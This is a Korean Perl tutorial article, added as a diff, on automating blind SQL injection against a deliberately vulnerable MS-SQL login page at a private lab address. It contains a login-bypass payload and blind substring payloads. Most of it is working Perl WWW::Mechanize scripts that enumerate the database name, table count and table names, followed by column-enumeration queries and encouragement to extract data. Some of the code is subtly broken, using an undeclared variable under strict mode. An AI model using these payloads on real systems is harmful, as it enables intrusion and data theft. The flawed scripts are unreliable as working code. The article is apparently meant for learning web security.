@@ -1,0 +1,235 @@
+# PERL과 보안 (SQL Injection 편) #
+
+## 저자 ##
+
++ [@vohrmana](https://twitter.com/vohrmana) - 보안에 관한 연구 및 강의 진행합니다. 게임으로 영어공부 중, 무려 5년만만에 달력 쓰네요, 예랑이
+
+
+## 시작하며 ##
+ 
++ 우리는 PERL을 이용하여 문자열을 쾌적하게 다룰 수 있는 방법을 알고 있습니다. C만 했던 예전의 저에겐 파격적이던 기억이 있습니다. 시간 가는 줄 모르고 Perl을 이용하여 별 쓸모없는 코드들을 만들어 내곤 했죠
++ 그 중 웹 해킹 공부를 위해 만들었던 코드 하나를 소개합니다. 함께 SQL Injection(Blind)에 대해 알아보고 해당 공격을 자동으로 해주는 툴을 대충 만들어 볼까 합니다.
++ UI(x), 편리기능(x)인 몸통만 말입니다 :)
+
+## SQL Injection ##
+
++ SQL Injection이란 사용자가 서버에게 전송한 데이터가 SQL Query에 삽입(Injection)되어 서버 사이드에 영향을 주게 되는 공격 기법입니다.
++ 크게 몇가지 패턴으로 나눠 보자면
+	1.  논리적 오류를 이용하는 방법
+	2.  형변환 에러를 이용하여 서버측 메세지를 확인 하는 방법
+	3.  2번을 사용 할 수 없을 때 사용되는 (Blind 상태) 방법 
+	4.  두개 이상의 쿼리를 전달하는 방법
+	5.  저장 및 확장 Procedure를 이용하는 방법
+	6.  기타, ... 등
+
+## 왜 하필 Blind? ##
++ 문자열이 가장 많이 들어갑니다.(MASS SQL 제외)
++ 그 뿐입니다.
+
+## 여기 취약한 페이지가 있습니다 ##
+![로그인사진](1.png)
+
++ 단순하게 로그인 기능만 들어있습니다. 그리고 이러면 안 되지만 취약점이 있게 만들었습니다. 
+
+	strSQL="select * from member where user_id='"&id&"' and user_pw='"&password&"'"
+
++ 일단 다음의 코드를 보시면 얼마나 취약한지 알 수 있습니다.
+	
+		id=test' or '1'='1'--
+		password=blah
+		strSQL="select * from member where user_id='test' or '1'='1'--' and user_pw='blah'"
+	
+## 필요사항 ##
++ 웹에 접근할 수 있는 수단이 필요합니다. LWP도 좋고, Mechanize도 좋습니다.
++ 당연하지만 PERL과 SQL에 대한 지식이 조금은 필요합니다.
++ 원하는 정보를 빨리 찾아내기 위하여 탐색 기법이라든지 Multithread가 필요할 수도 있지만 뺄 거에요 :)
++ 시간...
+
+## 출 바~알! ##
++ 우선 DB 이름을 찾아보도록 하죠. 일반적으로 DB 이름을 출력하기 위해 우리는 'DB_NAME()'을 이용하겠습니다.
++ 'mana'라는 계정은 이미 존재하는 계정입니다.
+	
+	strSQL="select * from member where user_id='mana' and substring(DB_NAME(),1,1)='a'--' and user_pw='blah'"
+
++ id 입력 부분부터 주석처리(--)까지를 보시면 substring을 이용하여 첫번째 글자부터 한 글자를 잘라내어 a와 비교하는 것을 볼 수 있습니다. 만약 첫 글자가 a라면 결과는 참이 되면서 mana라는 계정으로 로그인되겠죠? 이러한 특징을 이용하여 다음과 같이 패턴을 뽑아보면
+
+	"select * from member where user_id='mana' and substring(DB_NAME(),$i,1)='$char'--' and user_pw='blah'"
+
++ 여기서 $i와 $char를 반복적으로 변경해주면서 사이트에 요청을 보내는 코드를 작성해봤습니다.
+
+		use strict;
+		use warnings;
+		use WWW::Mechanize;
+		my $mech = WWW::Mechanize->new();
+		my @db_name;
+		my $i=1;
+		my $flag;
+		
+		print "=====DB_NAME====\n";
+		while(1){
+			local $| = 1;
+			$flag = 0;
+			foreach my $char ("",'a'..'z',0..9,'_') {
+				$mech->get( 'http://172.168.19.133/member/member_login.asp' );
+		
+				$mech->submit_form(
+					form_name => 'form',
+					fields    => { 
+						user_id  => "mana' and substring(db_name(),$i,1)='$char'--",
+						user_pw  => 'blah'
+					}
+				);
+				if($n eq "" && $mech->content !~ /alert/){
+					$mech->get( 'http://172.168.19.133/member/member_logout.asp' );
+					$flag = 1;
+					last;
+				}
+				unless($mech->content =~ /alert/){
+					print $n;
+					push @db_name, $char;
+					$i++;
+					$mech->get( 'http://172.168.19.133/member/member_logout.asp' );
+					last;
+				}
+			}
+			if ($flag) {
+				last;
+			}
+		}
+	1. 로그인 성공시 메인페이지로 리다이렉트 되며, 로그인 실패시 실패에 관련된 alert이 뜨도록 되어있습니다.
+	2. 편의상 Mechanize를 사용하였지만 LWP모들, HTTP모듈등 HTTP트래픽을 보낼수 있다면 어떤 모듈도 상관 없습니다.
+	3. 언제나 그렇지만 여러 고수님들께 코드를 보여드리는 것은 부담되네요 ㅠ.ㅠ	
+
++ 해당 코드를 실행시켜보면 DB의 이름을 얻어 올 수 있습니다.
+
+## 가뿐하게 달리며... ##
++ 이번엔 테이블을 알아보려 합니다.
++ 지금부터가 시작입니다.
++ 기본적으로 MS-SQL에서는 모든 테이블의 정보가 _sysobjects_ 테이블에 있습니다.
++ DB 이름을 알아 왔던 것 처럼 다음과 같은 상황을 만들 필요가 있겠네요
+	
+	strSQL="select * from member where user_id='mana' and substring((select top 1 name from sysobjects where xtype='U'),1,1)='a'--' and user_pw='blah'"
+	1. _sysobjects_테이블에서 _xtype_이 'U'(사용자 정의 테이블)인 테이블을 대상으로
+	2. 출력되어지는 가장 첫번째 테이블의 이름을
+	3. _substring_함수를 이용하여 첫번째 문자부터 한개의 문자를 'a'와 비교 
+
++ __야호!!__ 복잡해 보이지만 아직 힘들어 하시면 아니 됩니다.
++ 마찬가지로 패턴을 뽑아 보면 다음처럼 표현이 됩니다.
+
+	strSQL="select * from member where user_id='mana' and substring((select top 1 name from sysobjects where xtype='U'),$i,1)='$char'--' and user_pw='blah'"
+
++ 이것으로 테이블 이름 한개를 얻어 올 수 있게 됩니다.
++ 즉, __나머지 테이블 이름__은 얻어 올 수가 없죠
++ 만약 우리가 얻어온 첫번째 테이블 명이 'member'라는 테이블이라면, 두번째 테이블을 얻어오기 위해 다음과 같이 패턴을 변경 할 필요가 있습니다.
+
+	strSQL="select * from member where user_id='mana' and substring((select top 1 name from sysobjects where xtype='U' and name!='member'),$i,1)='$char'--' and user_pw='blah'"
+	1. _sysobject_테이블에서 'member'테이블을 제외시켜 출력.
+
++ 해당하는 내용을 포함시켜 패턴을 만들어 보면
+
+	strSQL="select * from member where user_id='mana' and substring((select top 1 name from sysobjects where xtype='U' $base_query),$i,1)='$char'--' and user_pw='blah'"
+	1. _$base_query_부분에 찾아낸 모든 테이블 명을 제외시키는 내용이 들어갑니다.
+	2. 우리는 몇개의 테이블이 존재하는지 모르고 있습니다...
+
++ 우선 몇개의 테이블이 존재하는지 확인을 해야 겠네요(반복문 반복 횟수)
+
+		my $cnt;
+		for ($cnt=1; ;$cnt++) {
+			$mech->get( 'http://172.168.19.133/member/member_login.asp' );
+			$mech->submit_form(
+				form_name => 'form',
+				fields    => { 
+					user_id  => "mana' and(select count(name) from sysobjects where xtype='U')=$cnt--",
+					user_pw  => 'blah'
+				}
+			);
+			unless($mech->content =~ /alert/){
+				print $cnt;
+				$mech->get( 'http://172.168.19.133/member/member_logout.asp' );
+				last;
+			}
+		}
+	1. count함수를 이용하여 간단하게 몇개의 테이블이 있는지 확인할 수 있습니다.
++ 반복 횟수가 나왔으니 이제 모든 테이블 명을 알아오죠
+
+		print "\n" . "="x20 . "\n";
+		print  "=====TABLE_NAME====\n";
+		@table_name;
+		@all_table;
+		$i=1;
+		$base_query = "";
+		foreach(1..$cnt){
+			while(1){
+				$inner_flag = 0;
+				foreach $char ("",'a'..'z',0..9,'_') {
+					$mech->get( 'http://172.168.19.133/member/member_login.asp' );
+					#print  "mana' and substring((select top 1 name from sysobjects where xtype='U' $base_query),$i,1)='$char'--\n";
+					$mech->submit_form(
+						form_name => 'form',
+						fields    => { 
+							user_id  => "mana' and substring((select top 1 name from sysobjects where xtype='U' $base_query),$i,1)='$char'--",
+							user_pw  => 'blah'
+						}
+					);
+					if($char eq "" && $mech->content !~ /alert/){
+						$mech->get( 'http://172.168.19.133/member/member_logout.asp' );
+						$inner_flag = 1;
+						last;
+					}
+					unless($mech->content =~ /alert/){
+						print $char;
+						push @table_name, $char;
+						$i++;
+						$outter_flag=0;
+						$mech->get( 'http://172.168.19.133/member/member_logout.asp' );
+						last;
+					}
+				}
+				if ($inner_flag) {
+					push @all_table, join ('',@table_name);
+					$base_query .= " and name!='" . join ('',@table_name)."' ";
+					print "\n";
+					$i=1;
+					@table_name=();
+					last;
+				}
+			}
+		}
+	1. *$base_query* 부분에 **$base_query .= " and name!='" . join ('',@table_name)."' ";** 내용을 넣어 생각해 보시면 해당 변수가 변한다는 것을 알 수 있습니다. 
+		+ and name != 'table1'
+		+ and name != 'table1'  and name != 'table2'
+		+ ...
+	2. 나머지 내용은 이전 DB명을 알아오는 상황과 같습니다. 
+
++ 마지막 쿼리만 보게 된다면 *mana' and substring((select top 1 name from sysobjects where xtype='U'  and nam
+e!='table1'  and name!='table2'  and name!='table3' ),7,1)=''--* 처럼 길어 지게 됩니다.
++ C나 JAVA를 배워보신 분들은 여태까지의 내용을 해당언어로 작성해 보는것이 좋습니다. 그래야 Perl을 쓰고 싶어지죠 :)
+
+## 난 틀렸어 먼저 가... ##
++ 우리는 DB의 이름과 모든 테이블의 이름들을 얻어왔습니다.
++ 이제 Column명을 알아와야 할 차례이지만 아쉽게도 지금부터 코딩은 여러분의 몫입니다.
++ 대신 만드는 방법을 _**알려는 드릴께..**_
++ 우선 MS-SQL에서 모든 Column들을 저장하고 있는 syscolumns테이블을 이용하겠습니다.
++ 이중 사용자 정의 테이블의 내용만 얻어오기 위해 다음과 같이 쿼리를 작성하여 봅니다.
+
+	select name from syscolumns where id = (select id from sysobjects where name='table')
+	1. 이때 table쪽에는 이전에 알아왔던 테이블 이름이 오면 되겠죠?
++ 제가 테스트 하고 있는 사이트에서는 제일 마지막 쿼리가 이렇게 나오게 되었네요
+
+	 mana' and substring((select top 1 name from syscolumns where id=(select top 1 id
+ from sysobjects where xtype='U'  and name!='zipcode'  and name!='board'  and na
+me!='dtproperties' )  and name!='address1'  and name!='address2'  and name!='age
+'  and name!='email'  and name!='homepage'  and name!='id'  and name!='name'  an
+d name!='nickname'  and name!='user_id'  and name!='user_pw'  and name!='zipcode
+'  ),1,1)='_'--
+
++ 단순한 패턴이지만 참 길게 느껴지네요
++ 여기까지의 내용으로 DB의 구조적인 내용들을 알아 왔다면, 이제 데이터도 추출이 가능합니다.
++ 꼭 성공하시길!!!
+
+## 마치며 ##
++ Perl의 장점인 문자열을 편하게 다룰 수 있다는 것을 표현해 드리고 싶었지만 생각보다 그 부분이 강조되지 않아 슬프네요 ㅠ.ㅠ
++ 그래도 직접 만들어 보시면 C or JAVA보다 엄청 편할 겁니다.
++ 제가 사용한 방법이 정석은 아닙니다. SQL Injection과 Perl Code는 여러 응용방법이 있습니다.
++ 학문적인 내용으로만 봐 주셨으면 합니다.
++ 여러분 Perl하세요 ( 급 마무리... )
